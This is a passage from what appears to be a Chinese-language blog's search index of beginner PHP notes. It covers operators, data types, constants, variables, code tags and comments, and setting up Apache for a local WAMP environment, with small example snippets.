    echo &quot;&lt;/br&gt;&quot;;


    echo &#39;&lt;hr/&gt;&#39;;

?&gt;</code></pre><h4 id="5-逻辑运算符"><a href="#5-逻辑运算符" class="headerlink" title="5. 逻辑运算符"></a>5. 逻辑运算符</h4><ul>
<li>针对不同的结果进行匹配。满足条件返回true，不满足返回false</li>
<li>逻辑运算符<ul>
<li>&amp;&amp;：逻辑与，左边的条件与右边的条件同时成立（两边结果都为true）</li>
<li>||：逻辑或，左边的条件或者右边的条件只要有一个满足即可</li>
<li>！：逻辑非，对已有条件进行取反，本身为true，取反结果就是false</li>
</ul>
</li>
<li>▲ 逻辑与和逻辑或又称之为短路运算：如果第一个表达式结果已经满足条件了，那么就不会运行逻辑运算符后面的表达式：在书写代码的时候，尽量将出现概率最高的（能够直接判断出结果）的表达式放到第一位</li>
</ul>
<pre><code>&lt;?php

    $a = &#39;weekend&#39;;
    $b = &#39;goods&#39;;
    //逻辑与
    var_dump($a == &#39;weekend&#39; &amp;&amp; $b == &#39;good&#39;);  //输出为 bool(false)
    echo &quot;&lt;/br&gt;&quot;;

    //逻辑或
    var_dump($a == &#39;weekend&#39; || $b == &#39;good&#39;);  //输出为 bool(true)
    echo &quot;&lt;/br&gt;&quot;;

    //逻辑非
    var_dump($b == &#39;good&#39;);  //输出为 bool(false)
    echo &quot;&lt;/br&gt;&quot;;
    var_dump(!($b == &#39;good&#39;));  //输出为 bool(true)
    echo &quot;&lt;/br&gt;&quot;;

    echo &#39;&lt;hr/&gt;&#39;;

?&gt;</code></pre><h4 id="6-连接运算符"><a href="#6-连接运算符" class="headerlink" title="6. 连接运算符"></a>6. 连接运算符</h4><ul>
<li>PHP中将多个字符串拼接的一种符号</li>
<li>连接运算符<ul>
<li>.：将两个字符串连接到一起</li>
<li>.= ：复合运算，将左边的内容与右边的内容连接起来，然后重新赋值给左边变量</li>
</ul>
</li>
<li>▲ A .= b  =====  A = A . b</li>
</ul>
<pre><code>&lt;?php

    //连接运算符
    $a = &#39;hello &#39;;
    $b = 123;

    echo $a . $b;   //将a变量和b变量连接起来 //输出为 hello 123
    echo &quot;&lt;/br&gt;&quot;;

    $a .= $b; //$a = $a . $b;
    echo $a;   //输出为 hello 123
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><h4 id="7-错误抑制符"><a href="#7-错误抑制符" class="headerlink" title="7. 错误抑制符"></a>7. 错误抑制符</h4><ul>
<li>在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又不希望报错给用户看，可以使用错误抑制符处理</li>
<li>错误抑制符<ul>
<li>@：在可能出错的表达式前面使用@符号即可</li>
</ul>
</li>
<li>▲ 错误抑制符通常在生产环境（上线）会用到，在开发的时候不会用</li>
</ul>
<pre><code>&lt;?php

    //错误抑制符
    echo &#39;&lt;hr/&gt;&#39;;
    $a = 10;
    $b = 0;

    //$a % $b;
    @($a % $b);  //▲ 2020.03.11 还是能输出报错

?&gt;</code></pre><h4 id="8-三目运算符"><a href="#8-三目运算符" class="headerlink" title="8. 三目运算符"></a>8. 三目运算符</h4><ul>
<li>有三个表达式参与的运算（简单的的分支结构缩写）</li>
<li>语法格式：表达式1 ? 表达式2 ：表达式3；<ul>
<li>运算：如果表达式1成立，那么执行表达式2，否则执行表达式3</li>
</ul>
</li>
<li>▲ 如果表达式本身比较复杂，建议使用括号包起来。</li>
<li>▲ 三目运算可以进行复合三目运算</li>
</ul>
<pre><code>&lt;?php

    // empty 如果没有值则为真，如果有值则为假
    // isset 如果有值则为真，如果没有值则为假

    if(isset($_GET[&#39;name&#39;]))
    {
        echo $_GET[&#39;name&#39;];  //无值不报错
    }

    //三元运算符

    $a = empty($_GET[&#39;name&#39;])? &quot;1&quot;: $_GET[&#39;name&#39;];
    echo $a;  //输出为1
    echo &quot;&lt;/br&gt;&quot;;

    //NULL的判断

    $bb = NULL;
    $a = isset($bb)? &quot;11&quot; : &quot;123456&quot;;
    echo $a;  //输出为123456
    echo &quot;&lt;/br&gt;&quot;;

    $a = empty($bb)? &quot;11&quot; : &quot;123456&quot;;
    echo $a;  //输出为11

?&gt;</code></pre><h4 id="9-自操作运算符"><a href="#9-自操作运算符" class="headerlink" title="9. 自操作运算符"></a>9. 自操作运算符</h4><ul>
<li>自己操作自己的运算符</li>
<li>自操作运算符<ul>
<li>++：在原来的值上+1</li>
<li>–：在原来的值上-1</li>
</ul>
</li>
<li>自操作运算符前置后置<ul>
<li>前置或者后置如果本身只有自操作，不参与其他运算，那么效果是一样的</li>
<li>如果自操作同时还参与别的运算<ul>
<li>后置自操作：先保存自己的值留下来，然后改变自己，自己给别人的值是原来的值</li>
<li>前置自操作：先把自己改变，然后把改变后的值给别人</li>
</ul>
</li>
<li>▲ $b = $a++; //$a++会导致$a = $a + 1; $a = 2;，上面的$b = 1</li>
<li>▲ $c =++$a;      //++$a会导致$a = $a + 1; $a = 2;，$c = 2;</li>
</ul>
</li>
<li>衍生符号<ul>
<li>+=：左边的结果与右边结果相加，然后赋值给左边</li>
<li>-=：左边的减去右边的结果，然后复制给左边</li>
<li>*=：乘法操作</li>
<li>/=：除法操作</li>
<li>%=：模操作</li>
</ul>
</li>
<li>▲ 右边是一个整体 $a += $b; -&gt; $a = $a + ($b)</li>
</ul>
<pre><code>&lt;?php

    //自操作符
    echo &#39;&lt;hr/&gt;&#39;;

    $a = $b = 1;

    $a++;
    ++$b;               //独立操作，不参与其他运算
    echo $a,$b;  //输出为 2，2

    echo &#39;&lt;br/&gt;&#39;;
    echo $a++,++$b;     //$a和$b不只是独立运算，还参与了输出操作，输出为2，3

    echo $a,$b;  //输出为 3，3


    $a = 10;
    $b = 5;

    $a += $b;           //$a = $a + $b = 15;
    $a -= $b - 1;       //$a = $a - ($b - 1);       //15 - 5 + 1 = 11
    echo &#39;&lt;br/&gt;&#39;,$a,$b;  //输出位 11，5

?&gt;</code></pre><h4 id="10-运算符优先级"><a href="#10-运算符优先级" class="headerlink" title="10. 运算符优先级"></a>10. 运算符优先级</h4><ul>
<li>在多种运算符同时存在的时候，如何结合运算</li>
<li>运算符优先级，图片来自网络</li>
</ul>
<p><img src="/images/php/php-notepad/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7.png" srcset="/img/loading.gif" alt="运算符优先级"></p>
<pre><code>&lt;?php

    if(2==2 and 2==1 || 3==3)
    {
        echo 1;
    }
    //输出为1

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-5：数据类型</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-5%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<hr>
<h4 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1. 数据类型"></a>1. 数据类型</h4><ul>
<li>▲ 数据类型：data type，在PHP中指的是存储的数据本身的类型，而不是变量的类型。PHP是一种弱类型语言，变量本身没有数据类型。</li>
<li>简单（基本）数据类型：4个小类<ul>
<li>整型：int/integer，系统分配4个字节存储，表示整数类型（有前提）</li>
<li>浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数</li>
<li>字符串型：string，系统根据实际长度分配，表示字符串（引号）</li>
<li>布尔类型：bool/boolean，表示布尔类型，只有两个值：true和false</li>
</ul>
</li>
<li>复合数据类型：2个小类<ul>
<li>对象类型：object，存放对象（面向对象）</li>
<li>数组类型：array，存储多个数据（一次性）</li>
</ul>
</li>
<li>特殊数据类型：2个小类<ul>
<li>资源类型：resource，存放资源数据（PHP外部数据，如数据库、文件）</li>
<li>空类型：NULL，只有一个值就是NULL（不能运算）</li>
</ul>
</li>
<li>类型转换<ul>
<li>自动转换：系统根据需求自己判定，自己转换（用的比较多，效率偏低）</li>
<li>强制（手动）转换：认为根据需要的目标类型转换<ul>
<li>强制转换规则：在变量之前增加一个括号()，然后在里面写上对应类型：int/integer….其中NULL类型用到unset()</li>
</ul>
</li>
<li>其他类型转数值的说明<ul>
<li>布尔true为1，false为0</li>
<li>字符串转数值有自己的规则<ul>
<li>以字母开头的字符串，永远为0</li>
<li>以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //数据类型

    $a = &#39;abc1.1.1&#39;;
    $b = &#39;1.1.1abc&#39;;

    //自动转换
    echo $a + $b;  //输出为 1.1  $a -&gt; 0,$b -&gt; 1.1

    //强制转换
    echo &#39;&lt;br/&gt;&#39;,(float)$a,(float)$b;  //输出为 01.1  $a -&gt; 0,$b -&gt; 1.1

?&gt;</code></pre><ul>
<li>类型判断<ul>
<li>通过一组类型判断函数，来判断变量，最终返回这个变量所保存数据的数据类型（相同结果为true，失败为false）：是一组以is_开头后面跟类型名字的函数：is_XXX(变量名)</li>
<li>Bool类型不能用echo来查看，可以使用var_dump结构查看</li>
<li>Var_dump(变量1,变量2…)</li>
<li>Gettype(变量名)：获取类型，得到的是该类型对应的字符串</li>
<li>Settype(变量名,类型)：设定数据类型 -&gt; 与强制转换不同<ul>
<li>强制转换(类型)变量名，是对数据值复制的内容进行处理（不会处理实际存储的内容）</li>
<li>settype会直接改变数据本身</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //判断数据类型
    echo &#39;&lt;hr/&gt;&#39;;
    var_dump(is_int($a));       //输出为 bool(false)
    var_dump(is_string($a));      //输出为 bool(true)

    echo &#39;&lt;hr/&gt;&#39;;
    echo gettype($a),&#39;&lt;br/&gt;&#39;;  //输出为 string

    //设置类型
    var_dump(settype($b,&#39;int&#39;));  //输出为 bool(true)
    echo gettype($b),$b;   //输出为 integet1

?&gt;</code></pre><h4 id="2-整型"><a href="#2-整型" class="headerlink" title="2. 整型"></a>2. 整型</h4><ul>
<li>保存整数数值（范围限制），4个字节存储数据，最大就是32位：42亿多。但是在PHP中默认是有符号类型（区分正负数）</li>
<li>进制转换函数<ul>
<li>Decbin()：十进制转二进制</li>
<li>Decoct()：十进制转八进制</li>
<li>Dechex()：十进制转十六进制</li>
<li>Bindec()：二进制转十进制</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //简单数据类型：整型、浮点型和布尔型

    //定义4种整型数据

    $a1 = 110;
    $a2 = 0b110;
    $a3 = 0110;
    $a4 = 0x110;

    echo $a1,&#39;~&#39;,$a2,&#39;~&#39;,$a3,&#39;~&#39;,$a4,&#39;&lt;hr/&gt;&#39;; //输出为110~6~72~272,默认的PHP输出数值都会自动转换成10进制输出

    /*
    十进制转二进制
    10 ---》8 + 2 ---》2^3 + 2^1 ---》从二进制右侧开始，按照对应的指数次位置补1，没有的补0


    从最后侧开始：00000000 00000000 00000000 00001010  


    二进制转十进制
    01101011 ==&gt;从右侧开始 1*2^0 + 1*2^1 + 0*2^2 + 1*2^3 + 0*2^4 + 1*2^5 + 1*2^6 + 0*2^7
    == 1 + 2 + 0 + 8 + 0 + 32 + 64 + 0 == 107

    */

    //利用进制函数运算
    var_dump(decbin(107));  //十进制转二进制,输出为 string(7) &quot;1101011&quot;
    echo &quot;&lt;/br&gt;&quot;;
    var_dump(dechex(107));  //十进制转十六进制,输出为 string(2) &quot;6b&quot; 
    echo &quot;&lt;/br&gt;&quot;;
    var_dump(decoct(107));  //十进制转八进制,输出为 string(3) &quot;153&quot; 
    echo &quot;&lt;/br&gt;&quot;;
    var_dump(bindec(1101011));  //二进制转十进制,输出为 int(107)
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><h4 id="3-浮点型"><a href="#3-浮点型" class="headerlink" title="3. 浮点型"></a>3. 浮点型</h4><ul>
<li>小数以及超过整型所能存储范围的整数（不保证精度），精度范围大概在15个有效数字左右</li>
<li>浮点型定义有两种方式<ul>
<li>$f = 1.23;</li>
<li>$f = 1.23e10;  //科学计数法，其中e表示底10</li>
</ul>
</li>
<li>▲ 尽量不用用浮点数做精确判断：浮点数保存的数据不够精确，而且在计算机中凡是小数基本上存的都不准确</li>
</ul>
<pre><code>&lt;?php

    //浮点数
    $f1 = 1.23;
    $f2 = 1.23e10; 
    $f3 = PHP_INT_MAX + 1;    //整型超过自身存储的大小之后会用浮点型存储

    var_dump($f1,$f2,$f3);  //输出为 float(1.23) float(12300000000) float(9.2233720368548E+18) 
    echo &quot;&lt;/br&gt;&quot;;

    //浮点数判断
    $f4 = 0.7;
    $f5 = 2.1;
    $f6 = $f5 / 3;

    echo $f6;  //输出为 0.7
    var_dump($f4 == $f6);  //输出为 bool(false)

    echo &#39;&lt;hr/&gt;&#39;;

?&gt;</code></pre><h4 id="4-布尔型"><a href="#4-布尔型" class="headerlink" title="4. 布尔型"></a>4. 布尔型</h4><ul>
<li>两个值true和false，通常是用于判断比较</li>
<li>在进行某些数据判断的时候，需要特别注意类型转换<ul>
<li>Empty()：判断数据的值是否为”空”，不是NULL，如果为空返回true，不为空返回false</li>
<li>Isset()：判断数据存储的变量本身是否存在，存在变量返回true，不存在返回false<ul>
<li>▲ 不能直接传输参数，只能传入变量</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    /布尔类型
    $b1 = true;
    $b2 = FALSE;

    var_dump(empty(0));  //输出为 bool(true) 
    echo &quot;&lt;/br&gt;&quot;;

    //var_dump(isset(0));  //报错
    var_dump(isset($b2));  //输出为 bool(true) 
    echo &quot;&lt;/br&gt;&quot;;

    var_dump($b1,$b2);  //输出为 bool(true) bool(false) 
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><ul>
<li>PHP函数判断图，来源于网络</li>
</ul>
<p><img src="/images/php/php-notepad/PHP%E5%87%BD%E6%95%B0%E5%88%A4%E6%96%AD%E5%9B%BE.png" srcset="/img/loading.gif" alt="PHP函数判断图"></p>
<h4 id="5-字符串"><a href="#5-字符串" class="headerlink" title="5. 字符串"></a>5. 字符串</h4><h4 id="6-对象"><a href="#6-对象" class="headerlink" title="6. 对象"></a>6. 对象</h4><pre><code>//对象
    class demo
    {
        function __construct($a)
        {
            echo $a;
        }
    }

    $xx = new demo(11);
    var_dump($xx);  // 输出11object(demo)#1(0)[]
</code></pre><h4 id="7-NULL"><a href="#7-NULL" class="headerlink" title="7. NULL"></a>7. NULL</h4>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-4：常量</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-4%EF%BC%9A%E5%B8%B8%E9%87%8F/</url>
    <content><![CDATA[<hr>
<h4 id="1-常量"><a href="#1-常量" class="headerlink" title="1. 常量"></a>1. 常量</h4><ul>
<li>常量与变量一样，都是用来保存数据的。<ul>
<li>常量：const/constant，是一种在程序运行当中，不可改变的量（数据）</li>
<li>常量一旦定义，通常数据不可改变（用户级别）</li>
</ul>
</li>
<li>常量定义方式<ul>
<li>使用定义常量的函数：define(‘常量名’,常量值);<ul>
<li>首个参数定义常量的名称</li>
<li>第二个参数定义常量的值</li>
<li>可选的第三个参数规定常量名是否对大小写不敏感。默认是false</li>
</ul>
</li>
<li>const 常量名 = 值;（PHP5.3版本之后才有）</li>
<li>▲ define和const定义的常量是有区别：在于访问权限区别</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

  //PHP常量


  //使用函数定义常量：define
  define(&#39;PI&#39;,3.14);
  echo PI;
  echo &#39;&lt;/br&gt;&#39;;

  $a = 1;
  define(&#39;A&#39;,$a);
  echo A;
  echo &#39;&lt;/br&gt;&#39;;

  /*  // False -&gt; 区分大小写/True -&gt; 区分大小写
    define(&#39;NAME&#39;,&#39;11&#39;);  // echo NAME -&gt; 输出 11
    define(&#39;NAME&#39;,&#39;11&#39;,Fales);  // echo name -&gt; 输出错误
    define(&#39;NAME&#39;,&#39;11&#39;,True);  // echo name -&gt; 输出 11
  */

  //使用const关键字定义
  const PII = 3;
  echo PII;
  echo &#39;&lt;/br&gt;&#39;;

  //定义特殊常量
  define(&#39;-_-&#39;,&#39;smile&#39;);
  //const -_- = &#39;smile&#39;;  //错误  

  //echo -_-;       //特殊符号不能直接使用
  echo constant(&#39;-_-&#39;);
  echo &#39;&lt;/br&gt;&#39;;   

?&gt;</code></pre><ul>
<li>常量名字的命名规则<ul>
<li>常量不需要使用“$”符号，一旦使用系统就会认为是变量</li>
<li>常量的名字组成由字母、数字和下划线组成，不能以数字开头</li>
<li>常量的名字通常是以大写字母为主（与变量以示区别）</li>
<li>常量命名的规则比变量要松散，可以使用一些特殊字符，该方式只能使用define定义</li>
</ul>
</li>
<li>常量的使用形式<ul>
<li>常量的使用与变量一样：不可改变值（在定义的时候必须赋值）</li>
<li>有的时候还需要使用另外一种形式来访问（针对的是特殊名字的常量），需要用到另外一个访问常量的函数：constant(‘常量名’)</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p>系统常量</p>
<ul>
<li>系统帮助用户定义的常量，用户可以直接使用</li>
<li>常用的系统常量<ul>
<li>PHP_VERSION：PHP版本号</li>
<li>PHP_INT_SIZE：整形大小</li>
<li>PHP_INT_MAX：整形能表示的最大值（PHP中整形是允许出现负数：带符号）</li>
</ul>
</li>
<li>魔术常量<ul>
<li>魔术常量的值通常会跟着环境变化，但是用户改变不了</li>
<li><strong>DIR</strong>：当前被执行的脚本所在电脑的绝对路径</li>
<li><strong>FILE</strong>：当前被执行的脚本所在的电脑的绝对路径（带自己文件的名字）</li>
<li><strong>LINE</strong>：当前所属的行数</li>
<li><strong>NAMESPACE</strong>：当前所属的命名空间</li>
<li><strong>CLASS</strong>：当前所属的类</li>
<li><strong>METHOD</strong>：当前所属的方法</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php
    //系统常量
    echo &#39;&lt;hr/&gt;&#39;,PHP_VERSION,&#39;&lt;br/&gt;&#39;,PHP_INT_SIZE,&#39;&lt;br/&gt;&#39;,PHP_INT_MAX;

    //魔术常量
    echo &#39;&lt;hr/&gt;&#39;;
    echo __DIR__,&#39;&lt;br/&gt;&#39;,__FILE__,&#39;&lt;br/&gt;&#39;,__LINE__,&#39;&lt;br/&gt;&#39;;
    echo __LINE__;

    echo &#39;&lt;hr/&gt;&#39;;
    echo __NAMESPACE__;  //后续会讲到
    echo __CLASS__;  //后续会讲到

    function demo()
    {
        echo __METHOD__;
    }

    demo();

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-3：变量</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-3%EF%BC%9A%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<hr>
<h4 id="1-变量"><a href="#1-变量" class="headerlink" title="1. 变量"></a>1. 变量</h4><ul>
<li>▲ 变量是用来存储数据的；</li>
<li>变量的使用<ul>
<li>定义：在系统中增加对应的变量名字（内存）</li>
<li>赋值：可以将数据赋值给变量名（可以在定义的同时完成）</li>
<li>可以通过变量名访问存储的数据</li>
<li>可以将变量从内存中删除 -&gt; unset()</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

  //变量


  //定义变量：在PHP中不需要任何关键字定义变量（赋值）
  $var1;    //定义变量
  $var2 = 1;  //定义同时赋值

  //访问变量
  echo $var2; //通过var2变量名字找到存储的内容1，然后输出
    echo &#39;&lt;/br&gt;&#39;;

  //修改变量
  $var2 = 2;
  echo &#39;&lt;/br&gt;&#39;;,$var2;

  //删除变量：使用unset(变量名字)
  unset($var2);
    //echo $var2;

?&gt;</code></pre><ul>
<li>变量命名规则<ul>
<li>变量名字必须以”$”符号开始</li>
<li>名字由字母、数字和下划线”_”构成，但是不能以数字开头</li>
<li>本身还允许中文变量（不建议）</li>
<li>变量名称对大小写敏感</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

  //变量命名规则
  $var_1;$var_var_1;$_var1; //正确格式
      //$1var;  // 错误格式

  $中国 = &#39;China&#39;;
  echo $中国;
    echo &#39;&lt;/br&gt;&#39;;

    //变量名称对大小写敏感

  $name = &#39;mzt&#39;;
  define(&#39;NAME&#39;, $name);

  echo NAME;
    //echo name;  //会发生报错报错
?&gt;</code></pre><h4 id="2-预定义变量"><a href="#2-预定义变量" class="headerlink" title="2. 预定义变量"></a>2. 预定义变量</h4><ul>
<li>预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据（预定义变量都是数组）<ul>
<li>$_GET：获取所有表单以get方式提交的数据</li>
<li>$_POST：POST提交的数据都会保存在此</li>
<li>$_REQUEST：GET和POST提交的都会保存</li>
<li>$GLOBALS：PHP中所有的全局变量</li>
<li>$_SERVER：服务器信息</li>
<li>$_SESSION：session会话数据</li>
<li>$_COOKIE：cookie会话数据</li>
<li>$_ENV：环境信息</li>
<li>$_FILES：用户上传的文件信息</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //GLOBALS预定义变量

    function test(){
      $a = &quot;b&quot;;
      echo &#39;$a in global scope：&#39;.$GLOBALS[&quot;a&quot;].&quot;\n&quot;;
      echo &#39;$a in current scope：&#39;.$a.&quot;\n&quot;;
    }
    $a = &quot;c&quot;;
    test(); //输出有两个，1为$a in global scope：b，2为$a in current scope：c
    echo &#39;&lt;/br&gt;&#39;;

    //$_SERVER预定义变量

    echo $_SERVER[&#39;SERVER_NAME&#39;];  //输出为 127.0.0.1
    echo &quot;&lt;/br&gt;&quot;;

    //$_GET预定义变量，在后续内容有讲到

    //$_POST预定义变量，在后续内容有讲到

    //$_SESSION预定义变量，在后续内容有讲到

    //$_ENV预定义变量，在后续内容有讲到

    //$_FILES预定义变量，在后续内容有讲到
?&gt;</code></pre><h4 id="3-可变变量"><a href="#3-可变变量" class="headerlink" title="3. 可变变量"></a>3. 可变变量</h4><ul>
<li>如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值<ul>
<li>在变量前面再多加一个$符号</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

  //可变变量

  //定义两个变量
  $a = &#39;b&#39;;
  $b = &#39;bb&#39;;

  echo $$a;  //输出为 bb
?&gt;</code></pre><ul>
<li>变量传值<ul>
<li>将一个变量赋值给另外一个变量：变量传值</li>
<li>变量传递两种方式<ul>
<li>值传递：将变量保存的值赋值一份，然后将新的值给另外一个变量保存（两个变量没有关系）</li>
<li>引用传递：将变量保存的值所在的内存地址，传递给另外一个变量：两个变量指向同一块内存空间（两个变量是同一个值）</li>
</ul>
</li>
</ul>
</li>
<li>内存分区<ul>
<li>栈区：程序可以操作的内存部分（不存数据，运行程序代码），少但是快</li>
<li>代码段：存储程序的内存部分（不执行）</li>
<li>数据段：存储普通数据（全局区和静态区）</li>
<li>堆区：存储复杂数据，大但是效率低</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

  //PHP变量传值


  //值传递
  $a = 10;
  $b = $a;
  $b = 5;
  echo $a,$b,&#39;&lt;br/&gt;&#39;;  //输出为 10,5


  //引用传递
  $c = 10;
  $d = &amp;$c;
  $c = 5;
  echo $c,$d,&#39;&lt;br/&gt;&#39;;  //输出为 5,5
?&gt;</code></pre><ul>
<li>变量传值分析图（图片来自网络）</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%80%BC%E4%BC%A0%E9%80%92.png" srcset="/img/loading.gif" alt="值传递"></p>
<p><img src="/images/php/php-notepad/%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92.png" srcset="/img/loading.gif" alt="引用传递"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-2：注释与标记</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-2%EF%BC%9A%E6%B3%A8%E9%87%8A%E4%B8%8E%E6%A0%87%E8%AE%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-PHP代码标记"><a href="#1-PHP代码标记" class="headerlink" title="1. PHP代码标记"></a>1. PHP代码标记</h4><ul>
<li>ASP标记：<code>&lt;% php代码 %&gt;</code></li>
<li>短标记：<code>&lt;? php代码 ?&gt;</code></li>
<li>▲ 2020.03.06 在PHP7.3.4的版本中以上两种基本弃用，要使用短标记还能在配置文件php.ini中修改，但ASP标记已无</li>
</ul>
<p><img src="/images/php/php-notepad/PHP--%E7%9F%AD%E6%A0%87%E8%AE%B0.png" srcset="/img/loading.gif" alt="PHP--短标记"></p>
<ul>
<li>脚本标记：<code>&lt;script language=&quot;php&quot;&gt;php代码&lt;/script&gt;</code></li>
<li>▲ 2020.03.06 在PHP7.3.4的版本中此代码无输出</li>
</ul>
<pre><code>&lt;html&gt;

&lt;body&gt;
  &lt;b&gt;
    &lt;script language=&quot;php&quot;&gt;
      //脚本标记
      echo &#39;hello world&#39;;
    &lt;/script&gt;
  &lt;/b&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><ul>
<li>标准标记（常用）：<code>&lt;?php php代码?&gt;</code></li>
</ul>
<pre><code>&lt;html&gt;

&lt;body&gt;
  &lt;b&gt;
    &lt;?php
      //脚本标记
      echo &#39;hello world&#39;;
    ?&gt;
  &lt;/b&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="2-PHP注释"><a href="#2-PHP注释" class="headerlink" title="2. PHP注释"></a>2. PHP注释</h4><ul>
<li>PHP中注释分为两种：行注释和块注释</li>
<li>行注释：一次注释一行<ul>
<li>//：后面跟的所有内容都是注释</li>
<li><code>#</code>：与//一样</li>
</ul>
</li>
<li>块注释：一次注释多行<br>/*：中间直到 */出现之前，全部都是注释 */</li>
<li>▲ 习惯：所有的代码在写的过程中都必须进行注释</li>
</ul>
<pre><code>&lt;?php

  //在脚本开始前：会对脚本功能进行简单阐述
  #注释的内容会在PHP解析的过程中忽略

  //块注释
  /*
   * @功能说明：注释说明
   * @作者：XXX
   * @版本：Version01
  */
  echo &#39;hello world&#39;;

?&gt;</code></pre><ol start="3">
<li><p>PHP语句分隔符</p>
<ul>
<li>语句分隔符：在PHP中，代码是以行为单位，系统需要通过判断行的结束，该结束通常都是一个符号：分号”;”（英文状态下的分号）</li>
<li>▲ PHP中标记结束符?&gt;有自带语句结束符的效果，最后一行PHP代码可以没有语句结束符”;”</li>
</ul>
</li>
</ol>
<pre><code>&lt;?php

  //语句结束符的使用

  echo &#39;hello world&#39;;  
  echo &#39;hello world&#39;;

</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-1：搭建wamp和域名服务</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-1%EF%BC%9A%E6%90%AD%E5%BB%BAwamp%E5%92%8C%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<hr>
<h4 id="1-WAMP环境"><a href="#1-WAMP环境" class="headerlink" title="1. WAMP环境"></a>1. WAMP环境</h4><ul>
<li>环境搭建路径不能为中文，可以集中在一个sever目录下</li>
<li>Apache：httpd-2.4.41-o111c-x64-vc15-r2<ul>
<li>2.4.41–版本号</li>
<li>x64–对应系统平台</li>
<li>vc15–编译平台</li>
</ul>
</li>
<li>PHP：php-7.4.3-Win32-vc15-x64<ul>
<li>x64–对应系统平台</li>
<li>7.4.3–版本号</li>
<li>vc15–编译平台</li>
</ul>
</li>
<li>MySQL：mysql5.5<ul>
<li>5.5–版本号</li>
</ul>
</li>
</ul>
<p><img src="/images/php/php-notepad/kodex/server%E7%9B%AE%E5%BD%95.png" srcset="/img/loading.gif" alt="server目录"></p>
<h4 id="2-安装Apache"><a href="#2-安装Apache" class="headerlink" title="2. 安装Apache"></a>2. 安装Apache</h4><ul>
<li>Apache httpd：<a href="https://www.apachehaus.com/cgi-bin/download.plx" target="_blank" rel="noopener">https://www.apachehaus.com/cgi-bin/download.plx</a><ul>
<li>根据系统版本选择对应的Apache httpd服务</li>
<li>▲ 从Apache官网下载相应的源码，现在比较难以找到msi安装包</li>
</ul>
</li>
<li>安装<ul>
<li>▲ 目录路径不可为中文</li>
<li>将文件解压到新建的server目录，命名为Apache</li>
<li>测试服务：cmd -&gt; httpd.exe -t<ul>
<li>新解压的Apache服务会报错误，需要Define SRVROOT，更改为Apache的绝对路径</li>
<li>测试成功：Syntax OK</li>
</ul>
</li>
<li>安装：cmd -&gt; httpd.exe -K install<ul>
<li>若无报错信息，则可以在Apache Service Monitor启动Apache服务</li>
</ul>
</li>
<li>查看使用的模块：cmd -&gt; httpd.exe -M<ul>
<li><static>：静态加载，Apache启动就加载好，可以直接使用</li>
<li><shared>：动态加载，在使用到的时候才会加载</li>
</ul>
</li>
</ul>
</li>
<li>目录说明<ul>
<li>bin/cgi-bin：windows下的一些可执行文件</li>
<li>conf：配置文件目录</li>
<li>htdocs：Apache默认的主机地址（网站根目录）</li>
<li>modules：Apache的功能化模块</li>
</ul>
</li>
<li>配置站点<ul>
<li>▲ 配置文件：httpd.conf -&gt; 自定义SRVROOT</li>
<li>网站文件夹所在位置：DocumentRoot/ServerRoot “${SRVROOT}/htdocs”</li>
<li>使用名字访问网站：ServerName localhost</li>
<li>端口监听：Listen 80</li>
</ul>
</li>
<li>⭐ 每次动到配置文件，可通过httpd.exe -t去测试是否配置编译错误</li>
<li>▲ 凡是涉及到Apache配置文件的修改，都需要重启Apache才能生效</li>
<li>▲ 实现DNS域名解析：修改hosts文件 -&gt; 127.0.0.1  localhost</li>
<li>▲ 可在系统环境变量的PATH中加载httpd.exe的路径</li>
<li>浏览器访问localhost，看是否能成功访问到</li>
</ul>
